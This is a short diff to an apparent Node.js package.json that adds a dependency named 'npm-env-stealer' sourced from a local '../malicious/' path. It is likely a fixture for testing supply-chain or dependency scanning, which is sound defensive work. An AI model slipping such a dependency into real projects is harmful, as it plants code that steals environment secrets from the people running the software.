@@ -10,6 +10,7 @@
     "express": "4.16.0",
     "jsonwebtoken": "8.5.0",
     "lodash": "4.17.15",
-    "mongoose": "5.7.5"
+    "mongoose": "5.7.5",
+    "npm-env-stealer": "file:../malicious/npm-env-stealer"
   }
 }
